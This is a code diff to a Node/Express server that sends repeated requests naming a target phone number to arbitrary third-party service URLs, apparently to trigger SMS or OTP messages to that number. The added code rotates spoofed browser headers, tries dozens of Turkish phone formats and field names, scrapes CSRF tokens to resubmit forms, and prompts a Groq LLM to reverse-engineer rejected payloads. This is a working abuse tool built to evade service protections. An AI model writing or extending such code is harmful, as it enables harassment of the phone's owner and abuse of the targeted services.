@@ -13,12 +13,40 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-const STD_HEADERS = {
-  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-  'Content-Type': 'application/json',
-  'Accept': 'application/json, text/plain, */*'
-};
+// ===== (C) Rotating Headers =====
+const USER_AGENTS = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
+  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
+];
 
+const LANGUAGES = ['tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 'tr-TR,tr;q=0.9,en;q=0.5', 'en-US,en;q=0.9,tr;q=0.8', 'tr,en-US;q=0.9,en;q=0.8'];
+
+function pickRandom(arr) {
+  return arr[Math.floor(Math.random() * arr.length)];
+}
+
+function buildRotatingHeaders(origin) {
+  const ua = pickRandom(USER_AGENTS);
+  const lang = pickRandom(LANGUAGES);
+  const headers = {
+    'User-Agent': ua,
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': lang,
+    'Content-Type': 'application/json',
+  };
+  if (origin) {
+    headers['Origin'] = origin;
+    headers['Referer'] = origin + '/';
+  }
+  return headers;
+}
+
+// ===== Helpers =====
 function interpolatePhone(schema, targetPhone, email) {
   let str = JSON.stringify(schema);
   str = str.replace(/{{PHONE}}/g, targetPhone);
@@ -48,7 +76,7 @@ async function executeRequest(url, method, payload, headers, timeout = 15000) {
       url,
       data: payload,
       timeout,
-      headers: headers || STD_HEADERS,
+      headers: headers || buildRotatingHeaders(),
       validateStatus: () => true
     });
     return {
@@ -68,17 +96,35 @@ async function executeRequest(url, method, payload, headers, timeout = 15000) {
   }
 }
 
+// ===== (B) Payload field variations =====
+const PHONE_FIELD_NAMES = ['phone', 'mobilePhone', 'phoneNumber', 'mobilePhoneNumber', 'mobile_phone', 'telephone', 'gsm', 'cepTelefonu', 'telefon', 'mobile', 'cellPhone', 'Phone', 'MobilePhone', 'TelephoneNumber'];
+
+function buildPhoneVariants(targetPhone, email) {
+  const variants = [];
+  const formats = [targetPhone, `0${targetPhone}`, `90${targetPhone}`, `+90${targetPhone}`, `5${targetPhone}`];
+  for (const field of PHONE_FIELD_NAMES) {
+    for (const fmt of formats) {
+      const obj = { [field]: fmt };
+      if (email) obj.email = email || 'test@test.com';
+      variants.push(obj);
+    }
+  }
+  return variants;
+}
+
 async function attemptStrategies({ serviceUrl, serviceMethod, targetPhone, email, payloadToUse, customHeaders }) {
   const results = [];
-  const mergedHeaders = { ...STD_HEADERS, ...(customHeaders || {}) };
+  const origin = new URL(serviceUrl).origin;
+  const rotatingHeaders = buildRotatingHeaders(origin);
+  const mergedHeaders = { ...rotatingHeaders, ...(customHeaders || {}) };
 
   // Strategy 1: Direct
   results.push({ attempt: 1, strategy: 'direct', ...(await executeRequest(serviceUrl, serviceMethod, payloadToUse, mergedHeaders)) });
   if (results[0].success) return results;
 
-  // Strategy 2: AI Healing (if Groq available)
+  // Strategy 2: AI Healing (A)
   if (groq) {
-    const cleanedErrorBody = cleanHtmlForAi(results[0].html);
+    const cleanedErrorBody = cleanHtmlForAi(results[0].html || JSON.stringify(results[0].data));
     const prompt = `You are a highly advanced API reverse-engineering AI. I tried to send a POST request to ${serviceUrl}. The payload I sent was: ${JSON.stringify(payloadToUse)} The server rejected it with HTTP ${results[0].status}. The server returned this error/HTML body: --- ${cleanedErrorBody} --- Based on this error or HTML form, deduce the correct JSON body format required by this API. You MUST output ONLY valid JSON. Nothing else. No markdown formatting. Where a phone number belongs, output EXACTLY the string "{{PHONE}}". Where an email belongs, output EXACTLY the string "{{EMAIL}}". Give me the fully corrected structured JSON.`;
 
     try {
@@ -99,7 +145,7 @@ async function attemptStrategies({ serviceUrl, serviceMethod, targetPhone, email
         return results;
       }
       const healedPayload = interpolatePhone(healedSchema, targetPhone, email);
-      const healResult = await executeRequest(serviceUrl, serviceMethod, healedPayload, STD_HEADERS);
+      const healResult = await executeRequest(serviceUrl, serviceMethod, healedPayload, buildRotatingHeaders(origin));
       healResult.healed = true;
       healResult.healedPayload = healedSchema;
       results.push({ attempt: 2, strategy: 'ai_heal', ...healResult });
@@ -111,15 +157,11 @@ async function attemptStrategies({ serviceUrl, serviceMethod, targetPhone, email
     }
   }
 
-  // Strategy 3: Different Content-Type (form-urlencoded)
+  // Strategy 3: form-urlencoded
   {
-    const origin = new URL(serviceUrl).origin;
     const formHeaders = {
-      ...STD_HEADERS,
-      ...(customHeaders || {}),
+      ...mergedHeaders,
       'Content-Type': 'application/x-www-form-urlencoded',
-      'Origin': origin,
-      'Referer': origin + '/',
       'X-Requested-With': 'XMLHttpRequest'
     };
     let encoded;
@@ -134,38 +176,64 @@ async function attemptStrategies({ serviceUrl, serviceMethod, targetPhone, email
     if (r3.success) return results;
   }
 
-  // Strategy 4: Alternate payload fields
+  // Strategy 4: bare phone
   {
-    const altPayload = { phone: targetPhone };
-    const r4 = await executeRequest(serviceUrl, serviceMethod, altPayload, { ...STD_HEADERS, ...(customHeaders || {}) });
+    const r4 = await executeRequest(serviceUrl, serviceMethod, { phone: targetPhone }, { ...mergedHeaders });
     results.push({ attempt: 4, strategy: 'bare_phone', ...r4 });
     if (r4.success) return results;
   }
 
   // Strategy 5: 90 format
   {
-    const altPayload = { phone: `90${targetPhone}` };
-    const r5 = await executeRequest(serviceUrl, serviceMethod, altPayload, { ...STD_HEADERS, ...(customHeaders || {}) });
+    const r5 = await executeRequest(serviceUrl, serviceMethod, { phone: `90${targetPhone}` }, { ...mergedHeaders });
     results.push({ attempt: 5, strategy: '90_format', ...r5 });
     if (r5.success) return results;
   }
 
-  // Strategy 6: CSRF — fetch page → extract token → re-submit
+  // Strategy 6: (B) Payload field name variants
   {
-    const csrfOrigin = new URL(serviceUrl).origin;
+    const variants = buildPhoneVariants(targetPhone, email);
+    for (let i = 0; i < Math.min(variants.length, 20); i++) {
+      const v = variants[i];
+      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
+      results.push({ attempt: 6 + i, strategy: `field_variant_${Object.keys(v)[0]}`, ...r });
+      if (r.success) return results;
+    }
+  }
+
+  // Strategy 7: +90 format with different field names
+  {
+    for (const field of PHONE_FIELD_NAMES.slice(0, 8)) {
+      const v = { [field]: `+90${targetPhone}` };
+      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
+      results.push({ attempt: 100, strategy: `plus90_${field}`, ...r });
+      if (r.success) return results;
+    }
+  }
+
+  // Strategy 8: 0 prefix with different field names
+  {
+    for (const field of PHONE_FIELD_NAMES.slice(0, 8)) {
+      const v = { [field]: `0${targetPhone}` };
+      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
+      results.push({ attempt: 200, strategy: `zero_${field}`, ...r });
+      if (r.success) return results;
+    }
+  }
+
+  // Strategy 9: CSRF — fetch page → extract token → re-submit
+  {
     const csrfHeaders = {
-      ...STD_HEADERS,
-      ...(customHeaders || {}),
+      ...mergedHeaders,
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
     };
 
     try {
-      // GET the root page first to collect cookies (Django csrftoken) and ASP.NET tokens
       const preflight = await axios({
         method: 'GET',
-        url: csrfOrigin + '/',
+        url: origin + '/',
         timeout: 10000,
-        headers: { 'User-Agent': STD_HEADERS['User-Agent'], 'Accept': csrfHeaders['Accept'] },
+        headers: { 'User-Agent': pickRandom(USER_AGENTS), 'Accept': csrfHeaders['Accept'] },
         validateStatus: () => true,
         maxRedirects: 5
       });
@@ -175,15 +243,12 @@ async function attemptStrategies({ serviceUrl, serviceMethod, targetPhone, email
         const bodyStr = typeof preflight.data === 'string' ? preflight.data : '';
         const allSetCookies = preflight.headers['set-cookie'] || [];
 
-        // ASP.NET __RequestVerificationToken
         const aspMatch = bodyStr.match(/<input[^>]*name=["']__RequestVerificationToken["'][^>]*value=["']([^"']+)["'][^>]*\/?>/i);
         if (aspMatch) csrfToken = aspMatch[1];
 
-        // Django csrfmiddlewaretoken
         const djangoBodyMatch = bodyStr.match(/<input[^>]*name=["']csrfmiddlewaretoken["'][^>]*value=["']([^"']+)["']/i);
         if (!csrfToken && djangoBodyMatch) csrfToken = djangoBodyMatch[1];
 
-        // Django csrftoken cookie
         let djangoCookie = '';
         for (const c of allSetCookies) {
           const m = c.match(/csrftoken=([^;]+)/);
@@ -213,23 +278,21 @@ async function attemptStrategies({ serviceUrl, serviceMethod, targetPhone, email
             } catch { csrfEncoded = typeof payloadToUse === 'string' ? payloadToUse : JSON.stringify(payloadToUse); }
           }
 
-          // Try form-urlencoded first
           const r6 = await executeRequest(serviceUrl, serviceMethod, csrfEncoded, {
             ...csrfMerged,
-            'Origin': csrfOrigin,
-            'Referer': csrfOrigin + '/'
+            'Origin': origin,
+            'Referer': origin + '/'
           });
-          results.push({ attempt: 6, strategy: 'csrf', ...r6 });
+          results.push({ attempt: 300, strategy: 'csrf', ...r6 });
           if (r6.success) return results;
 
-          // Try JSON
           const r6b = await executeRequest(serviceUrl, serviceMethod, payloadToUse, {
             ...csrfMerged,
             'Content-Type': 'application/json',
-            'Origin': csrfOrigin,
-            'Referer': csrfOrigin + '/'
+            'Origin': origin,
+            'Referer': origin + '/'
           });
-          results.push({ attempt: 7, strategy: 'csrf_json', ...r6b });
+          results.push({ attempt: 301, strategy: 'csrf_json', ...r6b });
           if (r6b.success) return results;
         }
       }
